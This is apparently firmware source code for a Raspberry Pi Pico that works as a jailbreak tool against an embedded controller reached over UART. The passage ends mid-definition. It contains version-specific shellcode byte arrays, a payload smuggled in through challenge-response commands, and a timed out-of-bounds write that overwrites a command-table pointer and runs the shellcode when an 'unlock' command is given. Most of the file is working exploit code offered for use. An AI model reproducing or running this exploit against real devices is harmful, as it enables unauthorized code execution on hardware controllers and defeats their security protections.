#include <algorithm>
#include <array>
#include <atomic>
#include <cstring>
#include <format>
#include <list>
#include <map>
#include <optional>
#include <string>
#include <vector>

#include <hardware/gpio.h>
#include <hardware/pio.h>
#include <hardware/structs/sio.h>
#include <hardware/sync.h>
#include <hardware/timer.h>
#include <pico/bootrom.h>

#include "pio_uart.pio.h"
#ifdef ENABLE_DEBUG_STDIO
#include <pico/stdio_usb.h>
#endif
#include <tusb.h>

#include "button.h"
#include "string_utils.h"
#include "types.h"
#include "uart.h"

u8 checksum(std::string_view buf) {
  u8 csum = 0;
  for (const auto& b : buf) {
    csum += b;
  }
  return csum;
}

bool validate_line(std::string* line) {
  if (line->empty()) {
    return false;
  }
  strip_trailing_crlf(line);
  auto last_colon = line->find_last_of(':');
  if (last_colon == line->npos || last_colon + 3 != line->size()) {
    return false;
  }
  std::vector<u8> csum;
  auto view = std::string_view(*line);
  if (!hex2buf(view.substr(last_colon + 1), &csum)) {
    return false;
  }
  if (csum[0] != checksum(view.substr(0, last_colon))) {
    return false;
  }
  line->resize(last_colon);
  return true;
}

enum StatusCode : u32 {
  kSuccess = 0,
  kRxInputTooLong = 0xE0000002,
  kRxInvalidChar = 0xE0000003,
  kRxInvalidCsum = 0xE0000004,
  kUcmdEINVAL = 0xF0000001,
  kUcmdUnknownCmd = 0xF0000006,
  // SyntheticError (our own codes)
  kEmcInReset = 0xdead0000,
  kFwConstsVersionFailed,
  kFwConstsVersionUnknown,
  kFwConstsInvalid,
  kSetPayloadTooLarge,
  kSetPayloadPuareq1Failed,
  kSetPayloadPuareq2Failed,
  kExploitVersionUnexpected,
  kExploitFailedEmcReset,
  kChipConstsInvalid,
  // For rom frames
  kRomFrame,
};

struct FwConstants {
  u32 ucmd_ua_buf_addr{};
  std::vector<u8> shellcode;
};

static std::map<std::string, FwConstants> fw_constants_map{
    // 1.0.4 E r5072
    {"E1E 0001 0000 0004 13D0",
     {0x1762e8,
      {0x00, 0xb5, 0x47, 0xf2, 0x00, 0x60, 0xc0, 0xf2, 0x15, 0x00, 0x43,
       0xf6, 0xe0, 0x71, 0xc0, 0xf2, 0x17, 0x01, 0x08, 0x60, 0x01, 0x20,
       0x45, 0xf2, 0x24, 0x71, 0xc0, 0xf2, 0x17, 0x01, 0x08, 0x60, 0x40,
       0xf6, 0x95, 0x71, 0xc0, 0xf2, 0x12, 0x01, 0x88, 0x47, 0x00, 0xbd}}},
    {"E1E 0001 0002 0003 1580",
     {0x17de38,
      {0x00, 0xb5, 0x4a, 0xf2, 0x30, 0x30, 0xc0, 0xf2, 0x15, 0x00, 0x4a,
       0xf2, 0xec, 0x61, 0xc0, 0xf2, 0x17, 0x01, 0x08, 0x60, 0x01, 0x20,
       0x4d, 0xf2, 0x40, 0x21, 0xc0, 0xf2, 0x17, 0x01, 0x08, 0x60, 0x42,
       0xf6, 0x31, 0x01, 0xc0, 0xf2, 0x12, 0x01, 0x88, 0x47, 0x00, 0xbd}}},
    {"E1E 0001 0004 0002 1752",
     {0x184d9c,
      {0x00, 0xb5, 0x4d, 0xf2, 0x7c, 0x30, 0xc0, 0xf2, 0x15, 0x00, 0x41,
       0xf2, 0xc0, 0x11, 0xc0, 0xf2, 0x18, 0x01, 0x08, 0x60, 0x01, 0x20,
       0x43, 0xf6, 0x14, 0x71, 0xc0, 0xf2, 0x18, 0x01, 0x08, 0x60, 0x44,
       0xf2, 0x09, 0x31, 0xc0, 0xf2, 0x12, 0x01, 0x88, 0x47, 0x00, 0xbd}}},
    {"E1E 0001 0008 0002 1B03",
     {0x19261c,
      {0x00, 0xb5, 0x45, 0xf6, 0xe8, 0x20, 0xc0, 0xf2, 0x16, 0x00, 0x4e,
       0xf2, 0x90, 0x21, 0xc0, 0xf2, 0x18, 0x01, 0x08, 0x60, 0x01, 0x20,
       0x41, 0xf2, 0x30, 0x71, 0xc0, 0xf2, 0x19, 0x01, 0x08, 0x60, 0x47,
       0xf6, 0xbd, 0x11, 0xc0, 0xf2, 0x12, 0x01, 0x88, 0x47, 0x00, 0xbd}}},
};

struct ScopedIrqDisable {
  inline ScopedIrqDisable() { status = save_and_disable_interrupts(); }
  inline ~ScopedIrqDisable() { restore_interrupts(status); }
  u32 status{};
};

template <size_t BufferSize>
struct Buffer {
  constexpr size_t len_mask() const {
    static_assert(std::popcount(BufferSize) == 1);
    return BufferSize - 1;
  }
  constexpr size_t add(size_t val, size_t addend) const {
    return (val + addend) & len_mask();
  }
  constexpr size_t read_available() const {
    if (wpos >= rpos) {
      return wpos - rpos;
    }
    return BufferSize - rpos + wpos;
  }
  constexpr bool empty() const { return rpos == wpos; }
  bool read_line(std::string* line) {
    // aggressively inlining compilers could wind up making this an empty delay
    // loop if num_newlines==0 on entry. This barrier prevents that.
    std::atomic_signal_fence(std::memory_order_acquire);
    // purposefully done before masking irqs as a speed hack
    if (!num_newlines || empty()) {
      return false;
    }
    bool got_line = false;
    {
      ScopedIrqDisable irq_disable;
      const auto avail = read_available();
      for (size_t i = 0; i < avail; i++) {
        const auto cpos = add(rpos, i);
        const auto c = buffer[cpos];
        if (c == '\n') {
          num_newlines--;
          rpos = add(cpos, 1);
          got_line = true;
          break;
        }
        line->push_back(c);
      }
    }
    if (got_line) {
      // validate and remove checksum
      // NOTE emc can emit invalid lines if its ucmd print func is reentered
      // (print called simultaneously via irq or task switch or something). Not
      // much can be done except trying not to hit this condition by waiting for
      // outputs before sending new cmd.
      if (validate_line(line)) {
        return true;
      }
#ifdef ENABLE_DEBUG_STDIO
      // TODO bubble error up to host?
      printf("DROP:%s\n", line->c_str());
#endif
    }
    // might have modified line, clear it
    line->clear();
    return false;
  }
  bool read_line_timeout(std::string* line, u32 timeout_us) {
    const u32 start = time_us_32();
    do {
      if (read_line(line)) {
        return true;
      }
    } while (time_us_32() - start < timeout_us);
    return false;
  }
  size_t read_buf(u8* buf, size_t len) {
    ScopedIrqDisable irq_disable;
    const auto avail = read_available();
    len = std::min(len, avail);
    for (size_t i = 0; i < len; i++) {
      const auto c = buffer[rpos];
      if (c == '\n') {
        num_newlines--;
      }
      *buf++ = c;
      rpos = add(rpos, 1);
    }
    return len;
  }
  // called from irq. cannot do allocs, etc.
  void push(u8 b) {
    const auto wpos_next = add(wpos, 1);
    if (wpos_next == rpos) {
      // overflow. basically fatal, should show error led or smth then fix bug?
      // drop the write here, as otherwise we'd have to fixup num_newlines
    } else {
      buffer[wpos] = b;
      wpos = wpos_next;
    }
    if (b == '\n') {
      num_newlines++;
    }
  }
  void setup_irq(Uart* uart) { uart_ = uart; }
  void uart_rx_handler() {
    uart_->try_read([&](u8 b) { push(b); });
  }
  void clear() {
    ScopedIrqDisable irq_disable;
    wpos = rpos = num_newlines = {};
  }
  Uart* uart_{};
  size_t wpos{};
  size_t rpos{};
  size_t num_newlines{};
  std::array<u8, BufferSize> buffer{};
};
using Buffer1k = Buffer<1024>;

struct ActiveLowGpio {
  void init(uint gpio) {
    gpio_ = gpio;
    gpio_init(gpio_);
  }
  void set_low() const {
    gpio_put(gpio_, 0);
    gpio_set_dir(gpio_, GPIO_OUT);
  }
  void release() const { gpio_set_dir(gpio_, GPIO_IN); }
  bool sample() const { return gpio_get(gpio_); }
  uint gpio_{};
};

struct EmcResetGpio : ActiveLowGpio {
  void reset() const {
    set_low();
    busy_wait_us(100);
    release();
  }
  bool is_reset() const { return sample() == false; }
};


struct UcmdClientEmc {
  bool init() {
    uart_rx_.setup_irq(&uart_);
    if (!uart_.init(0, 115200, rx_handler)) {
      return false;
    }
    rom_gpio_.init(2);
    reset_.init(3);
    return true;
  }

  void write_str_blocking(std::string_view buf, bool wait_tx = true) {
    uart_.write_blocking(reinterpret_cast<const u8*>(buf.data()), buf.size(),
                         wait_tx);
  }

  bool read_line(std::string* line, u32 timeout_us) {
    return uart_rx_.read_line_timeout(line, timeout_us);
  }

  static void rx_handler() {
    uart_rx_.uart_->try_read([](u8 b) {
      uart_rx_.push(b);
    });
  }

  void cdc_write(u8 itf, const std::vector<u8>& buf) {
    const auto len = buf.size();
    u32 num_written = 0;
    while (tud_cdc_n_connected(itf) && num_written < len) {
      num_written += tud_cdc_n_write(itf, &buf[num_written], len - num_written);
    }
    if (!tud_cdc_n_connected(itf)) {
      return;
    }
    tud_cdc_n_write_flush(itf);
  }

  // write as many lines from uart rx buffer to usb as possible within
  // max_time_us
  void cdc_process(u8 itf, u32 max_time_us = 1'000) {
    const u32 start = time_us_32();
    do {
      if (!in_rom_) {
        std::string line;
        if (!uart_rx_.read_line(&line)) {
          break;
        }
        dbg_println(std::format("host<{}", line));
        cdc_write(itf, Result::from_str(line).to_usb_response());
      } else {
        std::vector<u8> buf(0x100);
        const auto num_read = uart_rx_.read_buf(buf.data(), buf.size());
        buf.resize(num_read);
        if (buf.size()) {
          dbg_println(std::format("host<{}", buf2hex(buf)));
          cdc_write(itf, Result::new_ok(StatusCode::kRomFrame, buf2hex(buf))
                             .to_usb_response());
        }
      }
    } while (time_us_32() - start < max_time_us);
  }

  enum ResultType : u8 {
    kTimeout,
    kUnknown,
    kComment,
    kInfo,
    kOk,
    kNg,
  };

  struct Result {
    static Result from_str(std::string_view str) {
      // The parsing is a bit ghetto, but works

      // comments are just a string
      // e.g. # [PSQ] [BT WAKE Disabled Start]
      if (str.size() > 2 && str.starts_with("# ")) {
        auto response = std::string(str.substr(2));
        return {.type_ = kComment,
                .status_ = kInvalidStatus,
                .response_ = response};
      }
      // same with info lines...
      // e.g. $$ [MANU] PG2 ON
      if (str.size() > 3 && str.starts_with("$$ ")) {
        auto response = std::string(str.substr(3));
        return {
            .type_ = kInfo, .status_ = kInvalidStatus, .response_ = response};
      }

      // OK/NG must have status with optional string
      const auto status_offset = 2 + 1;
      const auto status_end = status_offset + 8;
      if (str.size() < status_end) {
        return new_unknown(str);
      }
      bool is_ok = str.starts_with("OK ");
      bool is_ng = str.starts_with("NG ");
      if (!is_ok && !is_ng) {
        return new_unknown(str);
      }

      auto status = int_from_hex<u32>(str, status_offset);
      if (!status.has_value()) {
        return new_unknown(str);
      }

      std::string response;
      if (str.size() > status_end) {
        if (str[status_end] != ' ') {
          return new_unknown(str);
        }
        response = str.substr(status_end + 1);
      }

      return {.type_ = is_ok ? kOk : kNg,
              .status_ = status.value(),
              .response_ = response};
    }
    static Result new_timeout() {
      return {.type_ = kTimeout, .status_ = kInvalidStatus};
    }
    static Result new_unknown(std::string_view str) {
      return {.type_ = kUnknown,
              .status_ = kInvalidStatus,
              .response_ = std::string(str)};
    }
    static Result new_ok(u32 status, const std::string& str = "") {
      return {.type_ = kOk, .status_ = status, .response_ = str};
    }
    static Result new_ng(u32 status, const std::string& str = "") {
      return {.type_ = kNg, .status_ = status, .response_ = str};
    }
    static Result new_success(const std::string& str = "") {
      return new_ok(StatusCode::kSuccess, str);
    }
    bool is_unknown() const { return type_ == kUnknown; }
    bool is_comment() const { return type_ == kComment; }
    bool is_info() const { return type_ == kInfo; }
    bool is_ok() const { return type_ == kOk; }
    bool is_ng() const { return type_ == kNg; }
    bool is_ok_or_ng() const { return is_ok() || is_ng(); }
    bool is_ok_status(u32 status) const { return is_ok() && status_ == status; }
    bool is_ng_status(u32 status) const { return is_ng() && status_ == status; }
    bool is_success() const { return is_ok_status(StatusCode::kSuccess); }
    std::string format() const {
      if (is_ok_or_ng()) {
        return std::format("{} {:08X} {}", is_ok() ? "OK" : "NG", status_,
                           response_);
      } else if (is_comment()) {
        return std::format("# {}", response_);
      } else if (is_info()) {
        return std::format("$$ {}", response_);
      } else if (is_unknown()) {
        return response_;
      } else {
        return "timeout";
      }
    }
    std::vector<u8> to_usb_response() const {
      auto response_len = response_.size();
      if (is_ok_or_ng()) {
        response_len += sizeof(status_);
      }

      std::vector<u8> data(sizeof(type_) + sizeof(response_len) + response_len);
      size_t pos = 0;

      std::memcpy(&data[0], &type_, sizeof(type_));
      pos += sizeof(type_);

      std::memcpy(&data[pos], &response_len, sizeof(response_len));
      pos += sizeof(response_len);

      if (is_ok_or_ng()) {
        std::memcpy(&data[pos], &status_, sizeof(status_));
        pos += sizeof(status_);
      }

      std::memcpy(&data[pos], &response_[0], response_.size());
      return data;
    }

    enum { kInvalidStatus = UINT32_MAX };
    ResultType type_{kTimeout};
    u32 status_{kInvalidStatus};
    std::string response_;
  };

  void dbg_println(const std::string& str, bool newline = true) {
#ifdef ENABLE_DEBUG_STDIO
    if (newline) {
      puts(str.c_str());
    } else {
      printf("%s", str.c_str());
    }
#endif
  }

  // read lines until one starts with "(OK|NG) <status>..."
  Result read_result(u32 timeout_us) {
    std::string line;
    while (read_line(&line, timeout_us)) {
      auto result = Result::from_str(line);
      if (result.is_ok_or_ng()) {
        return result;
      }
      dbg_println(result.format(), false);
    }
    return Result::new_timeout();
  }

  // reset the rx statemachine
  void nak() {
    write_str_blocking("\x15");
    busy_wait_ms(10);
  }

  // returns false if echo readback failed
  bool cmd_send(const std::string& cmdline, bool wait_echo = true) {
    // NOTE checksum could be fully disabled via nvs (va: 0xa09 {id:1,offset:9})
    auto cmd = cmdline + std::format(":{:02X}\n", checksum(cmdline));
    write_str_blocking(cmd, wait_echo);
    if (!wait_echo) {
      return true;
    }
    // wait for echo
    const u32 timeout = cmd.size() * 200;
    std::string readback;
    while (read_line(&readback, timeout)) {
      if (readback == cmdline) {
        return true;
      }
      dbg_println(std::format("discard {}", readback));
    }
    return false;
  }

  Result cmd_send_recv(const std::string& cmdline, u32 timeout_us = 10'000) {
    dbg_println(std::format("> {}", cmdline), false);
    if (!cmd_send(cmdline)) {
      dbg_println("<echo readback timeout");
      return Result::new_timeout();
    }
    auto result = read_result(timeout_us);
    dbg_println(std::format("< {}", result.format()));
    return result;
  }

  Result version() { return cmd_send_recv("version"); }
  Result getserialno() { return cmd_send_recv("getserialno"); }

  bool puareq1(u32 index) {
    // ignore the response (challenge data)
    // NOTE this response takes ~160ms
    return cmd_send_recv(std::format("puareq1 {:x}", index), 200'000)
        .is_success();
  }

  bool puareq2(u32 index, const std::vector<u8>& chunk) {
    // ignore the response (index)
    return cmd_send_recv(std::format("puareq2 {:x} {}", index, buf2hex(chunk)))
        .is_success();
  }

  Result resolve_constants() {
    if (fw_consts_valid_) {
      return Result::new_success();
    }
    auto result = version();
    if (!result.is_success()) {
      return Result::new_ng(StatusCode::kFwConstsVersionFailed,
                            result.format());
    }
    const auto& version_str = result.response_;
    auto fw_consts_it = fw_constants_map.find(version_str);
    if (fw_consts_it == fw_constants_map.end()) {
      return Result::new_ng(StatusCode::kFwConstsVersionUnknown, version_str);
    }
    fw_consts_ = fw_consts_it->second;
    fw_consts_valid_ = true;
    return Result::new_success();
  }

  Result set_payload(const std::vector<u8>& payload) {
    nak();
    // Need to ask for first part of challenge once to enable response
    // processing
    if (!puareq1(0)) {
      return Result::new_ng(StatusCode::kSetPayloadPuareq1Failed);
    }
    // Place payload. We must fit within 7 chunks of 50 bytes each.
    // The total size must be multiple of 50 bytes. Assume caller does this.
    const size_t chunk_len = 50;
    const size_t payload_len = payload.size();
    for (size_t pos = 0, idx = 0; pos < payload_len; pos += chunk_len, idx++) {
      std::vector<u8> chunk(&payload[pos],
                            &payload[std::min(pos + chunk_len, payload_len)]);
      if (!puareq2(idx, chunk)) {
        return Result::new_ng(StatusCode::kSetPayloadPuareq2Failed);
      }
    }
    return Result::new_success();
  }

  template <typename T>
  constexpr T align_up(T x, size_t align) {
    T rem = x % align;
    return x + (align - rem);
  }

  Result craft_and_set_payload() {
    // shove payload into ucmd_ua_buf
    // 0x184 byte buffer, we can control up to 350 bytes (must avoid sending
    // last chunk)
    constexpr size_t payload_max_len = 350;

    struct cmd_entry_t {
      u32 name{};
      u32 func{};
      u32 mask{};
    };
    const u32 payload_addr = fw_consts_.ucmd_ua_buf_addr;
    struct payload_t {
      // must have empty trailing entry
      cmd_entry_t entries[2];
      char cmd_name[sizeof(hax_cmd_name_)]{};
      alignas(4) u8 shellcode[0];
    } payload_prefix{
        .entries{{payload_addr + offsetof(payload_t, cmd_name),
                  (payload_addr + offsetof(payload_t, shellcode)) | 1, 0xf}}};
    strcpy(payload_prefix.cmd_name, hax_cmd_name_);

    const size_t payload_len =
        sizeof(payload_prefix) + fw_consts_.shellcode.size();
    if (payload_len > payload_max_len) {
      return Result::new_ng(StatusCode::kSetPayloadTooLarge);
    }

    std::vector<u8> payload;
    // size must be multiple of 50
    payload.resize(align_up(payload_len, 50));
    std::memcpy(&payload[0], &payload_prefix, sizeof(payload_prefix));
    std::memcpy(&payload[sizeof(payload_prefix)], &fw_consts_.shellcode[0],
                fw_consts_.shellcode.size());

    return set_payload(payload);
  }

  Result is_unlocked() {
    nak();
    // getserialno will work if shellcode ran
    return getserialno();
  }

  void write_oob(const std::array<u8, 4>& value) {
    // Need emc to start processing the following data fresh
    nak();

    // The exploit relies on sending non-ascii chars to overwrite pointer after
    // the recv buffer. Unfortunately, for some fw versions, ucmd_ua_buf_addr
    // has an ascii char in it, so the overwrite has to be done twice - once to
    // reach the third byte, then again to place the ascii second byte (which is
    // ascii and therefor will stop the overwrite).
    // The input path is: uart_irq (triggered on any byte / no fifo depth)
    //    -> 160byte rx ringbuffer -> uart_recv (buggy parser) -> 120byte buffer
    // Access to the 160byte ringbuffer is locked, and irq handler holds the
    // lock while uart has available bytes. uart_recv takes a byte at a time.

    // pad the rx statemachine to the end
    std::string output, output2;
    const u32 len = 160 * chip_consts_.filler_multiplier;
    const char lut[] =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for (u32 i = 0; i < len; i += 1) {
      output.push_back(lut[i % (sizeof(lut) - 1)]);
    }

    // overwrite, then reset the statemachine
    // actual overwrite will stop on first ascii char (in range [0x20,0x80) ),
    // but length is kept the same so timing is uniform.

    // advance cursor to end of buffer
    output2.push_back(0xc);
    // the data to write off the end
    for (auto& b : value) {
      output2.push_back(b);
    }
    // overwrite uart_index here too (to 0)
    output2.push_back(0);
    // NAK: reset rx statemachine
    output2 += "\x15";

    // TODO should interrupts be disabled? There doesn't seem to be a problem in
    // practice.
    write_str_blocking(output);

    // The important timer to tweak
    busy_wait_us(chip_consts_.pwn_delay_us);

    write_str_blocking(output2);

    // give some time for emc to process
    busy_wait_ms(chip_consts_.post_process_ms);
    // emc will also spew kRxInputTooLong errors, so need to discard all that
    // before continuing.
    uart_rx_.clear();
  }

  bool overwrite_cmd_table_ptr() {
    const u32 write_val = fw_consts_.ucmd_ua_buf_addr;
    std::array<u8, sizeof(write_val)> target;
    for (size_t i = 0; i < target.size(); i++) {
      const u8 b = (write_val >> (i * 8)) & 0xff;
      // just avoid special chars
      if (b == '\b' || b == '\r' || b == '\n' || b == '\x15') {
        return false;
      }
      target[i] = b;
    }
    for (size_t i = 0; i < target.size(); i++) {
      const auto pos = target.size() - i - 1;
      const u8 b = target[pos];
      if (b >= 0x20 && b < 0x80) {
        // we want to write an ascii char - data after it will be reached.
        auto to_send = target;
        for (size_t j = 0; j < pos + 1; j++) {
          to_send[j] = 0;
        }
        write_oob(to_send);
      }
    }
    write_oob(target);
    return true;
  }

  Result exploit_setup() {
    // This only needs to be done once (result cached)
    auto result = resolve_constants();
    if (!result.is_success()) {
      return result;
    }

    // Needs to be done once per emc boot
    result = craft_and_set_payload();
    if (!result.is_success()) {
      return result;
    }

    if (!overwrite_cmd_table_ptr()) {
      return Result::new_ng(StatusCode::kFwConstsInvalid);
    }
    return Result::new_success();
  }

  Result exploit_trigger() {
    // If cmd table ptr was modified, version will no longer be valid cmd
    // NOTE emc could crash here if ptr was incorrectly overwritten
    nak();
    auto result = version();
    if (!result.is_ng_status(StatusCode::kUcmdUnknownCmd)) {
      return Result::new_ng(StatusCode::kExploitVersionUnexpected,
                            result.format());
    }

    // trigger shellcode
    // the shellcode isn't expected to send a response
    // technically should insert respone to ensure it has executed, but in
    // practice hasn't been a problem.
    cmd_send(hax_cmd_name_);

    return is_unlocked();
  }

  Result autorun() {
    if (reset_.is_reset()) {
      return Result::new_ng(StatusCode::kEmcInReset);
    }

    // something (e.g. powerup) could have put cmd response on the wire already
    uart_rx_.clear();

    // already done? skip
    auto result = is_unlocked();
    if (result.is_success()) {
      return Result::new_success();
    }

    result = exploit_setup();
    if (result.is_ng()) {
      return result;
    }

    result = exploit_trigger();
    if (result.is_success()) {
      return Result::new_success();
    }
    // NOTE crash recovery takes ~13 seconds and console replies:
    // "OK 00000000:3A\n$$ [MANU] UART CMD READY:36" afterwards
    // It takes about 4.5 seconds from poweron to the same msg.
    // Sometimes the crash never recovers (via WDT) and needs manual reset.
    // header pins 8,19 go low ~7.5 seconds after failure, then high
    // ~750ms later, then msg appears ~3.7seconds later. i2c on pins 21,22
    // has activity ~200ms after 8,19 go high

    // Just assume WDT won't work and force a reset ASAP
    reset_.reset();

    // host should wait for success msg (~4.5seconds)
    return Result::new_ng(StatusCode::kExploitFailedEmcReset);
  }

  struct ChipConsts {
    // A bit more explanation of this:
    // The idea isn't that the chip processes all of the filler data we're
    // sending (we assume it will drop some bytes because it recieves them too
    // quickly). But, by sending enough bytes, we can be sure the ucmd rx buffer
    // is full, even if the uart ringbuffer in irq handler was dropping bytes.
    u32 filler_multiplier{};
    // Could probably just use the maximum required across chip versions here;
    // decreasing the time is only in interest of speed.
    u32 post_process_ms{};
    // This delay ensures the overflown bytes will make it into both buffers,
    // and be processed within the same invocation of the ucmd line buffer
    // parser.
    u64 pwn_delay_us{};
  };
  static constexpr ChipConsts salina_consts_{.filler_multiplier = 3,
                                             .post_process_ms = 200,
                                             .pwn_delay_us = 790};
  static constexpr ChipConsts salina2_consts_{.filler_multiplier = 6,
                                              .post_process_ms = 800,
                                              .pwn_delay_us = 900};

  Result set_chip_consts(const std::string& cmd) {
    const auto ng = Result::new_ng(StatusCode::kChipConstsInvalid);
    const auto success = Result::new_success();

    const auto parts = split_string(cmd, ' ');
    const auto num_parts = parts.size();
    if (num_parts == 2) {
      auto chip = parts[1];
      if (chip == "salina") {
        chip_consts_ = salina_consts_;
        return success;
      } else if (chip == "salina2") {
        chip_consts_ = salina2_consts_;
        return success;
      }
      return ng;
    } else if (num_parts == 4) {
      const auto filler_multiplier = int_from_hex<u8>(parts[1]);
      const auto post_process_ms = int_from_hex<u16>(parts[2]);
      const auto pwn_delay_us = int_from_hex<u16>(parts[3]);
      if (!filler_multiplier || !post_process_ms || !pwn_delay_us) {
        return ng;
      }
      chip_consts_ = {.filler_multiplier = *filler_multiplier,
                      .post_process_ms = *post_process_ms,
                      .pwn_delay_us = *pwn_delay_us};
      return success;
    }
    return ng;
  }

  Result set_fw_consts(const std::string& cmd) {
    const auto ng = Result::new_ng(StatusCode::kFwConstsInvalid);
    const auto parts = split_string(cmd, ' ');
    if (parts.size() != 4) {
      return ng;
    }
    auto version = parts[1];
    std::replace_if(
        version.begin(), version.end(), [](auto c) { return c == '.'; }, ' ');
    const auto buf_addr = int_from_hex<u32>(parts[2]);
    std::vector<u8> shellcode;
    if (!buf_addr.has_value() || !hex2buf(parts[3], &shellcode)) {
      return ng;
    }
    fw_constants_map.insert_or_assign(version,
                                      FwConstants{
                                          .ucmd_ua_buf_addr = buf_addr.value(),
                                          .shellcode = shellcode,
                                      });
    fw_consts_valid_ = false;
    fw_consts_ = {};
    return Result::new_success();
  }

  Result rom_enter_exit(const std::string& cmd) {
    const auto ng = Result::new_ng(StatusCode::kUcmdUnknownCmd);
    const auto parts = split_string(cmd, ' ');
    if (parts.size() != 2) {
      return ng;
    }
    const auto mode = parts[1];
    if (mode == "enter") {
      reset_.set_low();
      const auto reset_release = make_timeout_time_us(100);
      rom_gpio_.set_low();

      uart_.set_baudrate(460800);
      uart_rx_.clear();

      busy_wait_until(reset_release);
      in_rom_ = true;
      reset_.release();

      return Result::new_success();
    } else if (mode == "exit") {
      reset_.set_low();
      const auto reset_release = make_timeout_time_us(100);
      rom_gpio_.release();

      uart_.set_baudrate(115200);
      uart_rx_.clear();

      busy_wait_until(reset_release);
      in_rom_ = false;
      reset_.release();

      return Result::new_success();
    }
    return ng;
  }

  enum CommandType {
    kUnlock,
    kPicoReset,
    kEmcReset,
    kEmcRom,
    kSetFwConsts,
    kSetChipConsts,
    kPassthroughUcmd,
    kPassthroughRom,
  };

  CommandType parse_command_type(std::string_view cmd) {
    if (cmd.starts_with("unlock")) {
      return CommandType::kUnlock;
    } else if (cmd.starts_with("picoreset")) {
      return CommandType::kPicoReset;
    } else if (cmd.starts_with("picoemcreset")) {
      return CommandType::kEmcReset;
    } else if (cmd.starts_with("picoemcrom")) {
      return CommandType::kEmcRom;
    } else if (cmd.starts_with("picofwconst")) {
      return CommandType::kSetFwConsts;
    } else if (cmd.starts_with("picochipconst")) {
      return CommandType::kSetChipConsts;
    } else if (in_rom_) {
      return CommandType::kPassthroughRom;
    } else {
      return CommandType::kPassthroughUcmd;
    }
  }

  void process_cmd(u8 itf, const std::string& cmd) {
    dbg_println(std::format("host>{}", cmd));
    const auto cmd_type = parse_command_type(cmd);
    if (cmd_type == CommandType::kPassthroughUcmd) {
      // post cmd only - no wait
      cmd_send(cmd, false);
    } else if (cmd_type == CommandType::kPassthroughRom) {
      // note we can't have "true" passthrough because we're still line buffered
      // we used hex encoding to avoid escaping \n
      std::vector<u8> buf;
      if (hex2buf(cmd, &buf)) {
        uart_.write_blocking(buf.data(), buf.size(), false);
      }
    } else {
      // echo
      cdc_write(itf, Result::new_unknown(cmd).to_usb_response());

      auto result = Result::new_success();
      switch (cmd_type) {
      case CommandType::kUnlock:
        // autorun takes ~750ms
        result = autorun();
        break;
      case CommandType::kPicoReset:
        reset_usb_boot(0, 0);
        __builtin_unreachable();
        break;
      case CommandType::kEmcReset:
        reset_.reset();
        break;
      case CommandType::kEmcRom:
        result = rom_enter_exit(cmd);
        break;
      case CommandType::kSetFwConsts:
        result = set_fw_consts(cmd);
        break;
      case CommandType::kSetChipConsts:
        result = set_chip_consts(cmd);
        break;
      default:
        result = Result::new_ng(StatusCode::kUcmdUnknownCmd);
        break;
      }
      cdc_write(itf, result.to_usb_response());
    }
  }

  Uart uart_;
  static Buffer1k uart_rx_;
  ChipConsts chip_consts_{salina_consts_};
  bool fw_consts_valid_{};
  FwConstants fw_consts_;
  static constexpr const char hax_cmd_name_[] = "A";
  EmcResetGpio reset_;
  ActiveLowGpio rom_gpio_;
  bool in_rom_{};
};
Buffer1k UcmdClientEmc::uart_rx_;

struct Efc {
  bool init() {
    uart_rx_.setup_irq(&uart_);
    if (!uart_.init(1, 460800 /*700000*/, rx_handler)) {
      return false;
    }
    return true;
  }
  static void rx_handler() {
    uart_rx_.uart_->try_read([](u8 b) {
      uart_rx_.push(b);
    });
  }
  void cdc_process(u8 itf, u32 max_time_us = 1'000) {
    cdc_line_coding_t coding{};
    tud_cdc_n_get_line_coding(itf, &coding);
    uart_.set_baudrate(coding.bit_rate);

    const u32 start = time_us_32();
    do {
      const auto read_avail = static_cast<u32>(uart_rx_.read_available());
      const u32 write_avail = tud_cdc_n_write_available(itf);
      const auto xfer_len = std::min(read_avail, write_avail);
      if (!xfer_len) {
        break;
      }
      std::vector<u8> buf(xfer_len);
      uart_rx_.read_buf(buf.data(), buf.size());
      u32 num_written = 0;
      while (tud_cdc_n_connected(itf) && num_written < xfer_len) {
        num_written +=
            tud_cdc_n_write(itf, &buf[num_written], xfer_len - num_written);
      }
      if (!tud_cdc_n_connected(itf)) {
        return;
      }
      tud_cdc_n_write_flush(itf);
    } while (time_us_32() - start < max_time_us);
  }
  Uart uart_;
  static Buffer1k uart_rx_;
};
Buffer1k Efc::uart_rx_;

struct PioUart {
  static constexpr uint kTxPin = 10;
  static constexpr uint kRxPin = 11;
  static constexpr uint kDefaultBaud = 460800;

  bool init() {
    pio_ = pio0;
    sm_tx_ = pio_claim_unused_sm(pio_, true);
    sm_rx_ = pio_claim_unused_sm(pio_, true);
    offset_tx_ = pio_add_program(pio_, &pio_uart_tx_program);
    offset_rx_ = pio_add_program(pio_, &pio_uart_rx_program);
    pio_uart_tx_program_init(pio_, sm_tx_, offset_tx_, kTxPin, kDefaultBaud);
    pio_uart_rx_program_init(pio_, sm_rx_, offset_rx_, kRxPin, kDefaultBaud);
    baudrate_ = kDefaultBaud;
    return true;
  }

  void set_baudrate(uint baudrate) {
    if (baudrate_ == baudrate || baudrate == 0) return;
    float div = (float)clock_get_hz(clk_sys) / (baudrate * 8);
    pio_sm_set_clkdiv(pio_, sm_tx_, div);
    pio_sm_set_clkdiv(pio_, sm_rx_, div);
    pio_sm_clkdiv_restart(pio_, sm_tx_);
    pio_sm_clkdiv_restart(pio_, sm_rx_);
    baudrate_ = baudrate;
  }

  void cdc_process(u8 itf, u32 max_time_us = 1'000) {
    cdc_line_coding_t coding{};
    tud_cdc_n_get_line_coding(itf, &coding);
    set_baudrate(coding.bit_rate);

    // RX: PIO -> USB
    const u32 start = time_us_32();
    do {
      u32 write_avail = tud_cdc_n_write_available(itf);
      if (!write_avail) break;
      u32 count = 0;
      u8 buf[64];
      while (count < sizeof(buf) && count < write_avail &&
             !pio_sm_is_rx_fifo_empty(pio_, sm_rx_)) {
        buf[count++] = pio_sm_get(pio_, sm_rx_) >> 24;
      }
      if (!count) break;
      u32 num_written = 0;
      while (tud_cdc_n_connected(itf) && num_written < count) {
        num_written += tud_cdc_n_write(itf, &buf[num_written], count - num_written);
      }
      if (!tud_cdc_n_connected(itf)) return;
      tud_cdc_n_write_flush(itf);
    } while (time_us_32() - start < max_time_us);
  }

  void write_from_usb(const u8* data, u32 len) {
    for (u32 i = 0; i < len; i++) {
      // Blocking put — wait for TX FIFO space
      while (pio_sm_is_tx_fifo_full(pio_, sm_tx_)) {
        tight_loop_contents();
      }
      pio_sm_put(pio_, sm_tx_, data[i]);
    }
  }

